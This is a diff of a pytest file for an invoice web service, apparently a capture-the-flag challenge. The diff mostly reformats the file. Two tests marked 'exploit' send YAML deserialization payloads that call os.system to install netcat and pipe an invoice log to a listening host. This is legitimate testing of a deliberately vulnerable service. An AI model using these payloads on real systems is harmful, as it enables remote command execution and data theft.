@@ -11,15 +11,18 @@ import os
 logger = logging.getLogger()
 URL = f"http://{os.environ['SERVICE_HOST']}:7354"
 
+
 def test_invoice_overview():
     params = {'name': 'do-not-exist'}
     r = requests.get(URL, params)
     assert r.status_code == 200
     assert len(r.json()['invoices']) == 0
 
+
 def test_invoice_overview_error_handling():
     r = requests.get(URL)
     assert r.status_code == 404
+
 
 def test_add_invoice():
     params = {'name': 'somebody', 'item': 'pizza'}
@@ -30,9 +33,11 @@ def test_add_invoice():
     assert r.status_code == 200
     assert len(find_accounted_invoices(guest_name=params['name'], item=params['item'])) == n + 1
 
+
 def test_add_invoice_error_handling():
     r = requests.post(URL + '/add')
     assert r.status_code == 404
+
 
 def test_storno_invoice():
     guest_name = secrets.token_hex(8)
@@ -48,10 +53,12 @@ def test_storno_invoice():
     assert r.status_code == 200
     assert float(invoices[0]['amount']) + float(invoices[1]['amount']) == 0.0
 
+
 def test_storno_invoice_error_handling():
     params = {'number': 'non-exisitng'}
     r = requests.post(URL + '/storno', params)
     assert r.status_code == 404
+
 
 def test_request_bill():
     guest_name = secrets.token_hex(8)
@@ -65,9 +72,11 @@ def test_request_bill():
     assert r.json()['total'] == 10.0
     assert len(r.json()['items']) == 2
 
+
 def test_request_bill_error_handling():
     r = requests.get(URL + '/request-bill')
     assert r.status_code == 404
+
 
 @pytest.mark.no_pipeline_support
 def test_setting_log_level():
@@ -84,6 +93,7 @@ def test_setting_log_level():
     assert 'INFO' in invoice_logs
     assert 'DEBUG' not in invoice_logs
 
+
 @pytest.mark.no_pipeline_support
 def test_invoice_log_accounting():
     client = docker.from_env()
@@ -95,33 +105,40 @@ def test_invoice_log_accounting():
     latest_logs = container.logs().decode().replace(old_logs, '')
     assert 'ACCOUNT' in latest_logs
 
+
 @pytest.mark.no_pipeline_support
 @pytest.mark.exploit
 def test_exploit_invoice_overview():
     proc = subprocess.Popen(['nc', '-l', '7777'], stdout=PIPE)
 
-    params = {'name': 'whoever', 'log-level': '!!python/object/apply:os.system [nc -h || ( apt-get update && apt-get install netcat -y )]'}
-    requests.get(url = URL, params = params)
-    params = {'name': 'whoever', 'log-level': f"!!python/object/apply:os.system [cat /InvoiceApp/accounting/outstanding-invoices.log | nc {os.environ['TESTING_HOST']} 7777]"}
-    requests.get(url = URL, params = params)
+    params = {'name': 'whoever',
+              'log-level': '!!python/object/apply:os.system [nc -h || ( apt-get update && apt-get install netcat -y )]'}
+    requests.get(url=URL, params=params)
+    params = {'name': 'whoever',
+              'log-level': f"!!python/object/apply:os.system [cat /InvoiceApp/accounting/outstanding-invoices.log | nc {os.environ['TESTING_HOST']} 7777]"}
+    requests.get(url=URL, params=params)
 
     try:
         stdout, _ = proc.communicate(timeout=3)
     except TimeoutExpired:
         proc.kill()
         stdout, err = proc.communicate()
-        logger.warning(f'Waiting and listening to :7777 for exploit information ran into timeout. stdout: {stdout}, err: {err}')
+        logger.warning(
+            f'Waiting and listening to :7777 for exploit information ran into timeout. stdout: {stdout}, err: {err}')
 
     assert b'SECRET_ENO_TOKEN' in stdout
+
 
 @pytest.mark.no_pipeline_support
 @pytest.mark.exploit
 def test_exploit_add_invoice():
     proc = subprocess.Popen(['nc', '-l', '7777'], stdout=PIPE)
 
-    params = {'name': 'somebody', 'item': 'pizza', 'payment-method': '!!python/object/apply:os.system [nc -h || ( apt-get update && apt-get install netcat -y )]'}
+    params = {'name': 'somebody', 'item': 'pizza',
+              'payment-method': '!!python/object/apply:os.system [nc -h || ( apt-get update && apt-get install netcat -y )]'}
     requests.post(URL + '/add', params)
-    params = {'name': 'somebody', 'item': 'pizza', 'payment-method': f"!!python/object/apply:os.system [cat /InvoiceApp/accounting/outstanding-invoices.log | nc {os.environ['TESTING_HOST']} 7777]"}
+    params = {'name': 'somebody', 'item': 'pizza',
+              'payment-method': f"!!python/object/apply:os.system [cat /InvoiceApp/accounting/outstanding-invoices.log | nc {os.environ['TESTING_HOST']} 7777]"}
     requests.post(URL + '/add', params)
 
     try:
@@ -129,13 +146,16 @@ def test_exploit_add_invoice():
     except TimeoutExpired:
         proc.kill()
         stdout, err = proc.communicate()
-        logger.warning(f'Waiting and listening to :7777 for exploit information ran into timeout. stdout: {stdout}, err: {err}')
+        logger.warning(
+            f'Waiting and listening to :7777 for exploit information ran into timeout. stdout: {stdout}, err: {err}')
 
     assert b'SECRET_ENO_TOKEN' in stdout
+
 
 def add_invoice_to_accounting_log(guest_name, item):
     params = {'name': guest_name, 'item': item}
     requests.post(URL + '/add', params)
+
 
 def find_accounted_invoices(guest_name, item=None):
     params = {'name': guest_name}
@@ -148,4 +168,3 @@ def find_accounted_invoices(guest_name, item=None):
         if invoice['item'] == item:
             invoices.append(invoice)
     return invoices
-
